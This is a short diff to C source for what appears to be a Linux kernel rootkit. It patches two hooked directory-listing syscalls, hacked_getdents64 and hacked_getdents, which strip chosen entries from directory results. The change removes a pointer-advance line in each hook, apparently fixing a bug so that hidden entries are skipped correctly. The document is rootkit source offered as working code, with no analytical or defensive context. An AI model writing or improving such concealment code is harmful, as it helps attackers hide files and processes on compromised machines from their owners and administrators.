@@ -97,7 +97,6 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
@@ -149,7 +148,6 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
